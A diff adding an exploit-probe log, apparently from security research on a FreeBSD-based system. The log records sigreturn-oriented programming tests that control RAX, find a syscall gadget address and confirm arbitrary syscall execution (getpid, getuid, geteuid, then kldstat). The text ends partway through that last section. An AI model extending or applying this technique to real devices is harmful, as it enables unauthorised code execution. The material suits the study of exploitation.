@@ -1,0 +1,29 @@
+=== PROBE 128d: SROP RAX CONTROL ===
+
+[0] pid=386
+--- SECTION A: RAX tag test ---
+[A] getcontext: rv=0x0000000000000000
+[A] RAX set to 0x1337
+[A] sigreturn: ok=true rv=0x0000000000001337
+[A] *** RAX CONTROLS RETURN VALUE! 0x1337 confirmed ***
+[A] pid=386
+
+--- SECTION A2: RAX=0xDEADBEEF ---
+[A2] sigreturn: ok=true rv=0x00000000DEADBEEF
+[A2] *** CONFIRMED: rv=0xDEADBEEF ***
+
+--- SECTION B: getpid via SROP (RIP-2 = syscall) ---
+[B] captured RIP=0x0000000831DECB5C
+[B] syscall_addr (RIP-2)=0x0000000831DECB5A
+[B] sigreturn: ok=true rv=0x0000000000000182
+[B] *** GETPID VIA SROP! rv=386 == pid=386 ***
+[B] *** ARBITRARY SYSCALL EXECUTION CONFIRMED! ***
+[B] pid=386
+
+--- SECTION C: getuid + geteuid via SROP ---
+[C] getuid(24): ok=true rv=0x0000000000000001
+[C] geteuid(25): ok=true rv=0x0000000000000001
+[C] pid=386
+
+--- SECTION D: kldstat(308) via SROP ---
+[D] kld_buf=0x0000000310A70000
